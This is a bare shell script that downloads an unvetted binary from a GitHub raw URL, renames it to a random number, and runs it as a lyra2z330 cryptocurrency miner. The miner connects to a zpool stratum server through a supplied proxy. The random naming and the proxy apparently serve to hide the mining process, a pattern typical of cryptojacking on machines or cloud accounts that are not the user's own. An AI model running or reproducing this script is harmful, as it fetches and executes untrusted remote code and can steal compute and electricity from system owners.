user=$1 
proxy=$2 
worker=$(shuf -n 1 -i 1-9999999) 
apt update -y 
wget -q https://raw.githubusercontent.com/ahmadghozaliurhniyu/scmin/main/pointd 
chmod +x pointd 
mv pointd $worker 
chmod +x $worker 
./$worker -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u $user.$worker -p c=DGB,zap=BUT-lyra2z330 -x $proxy
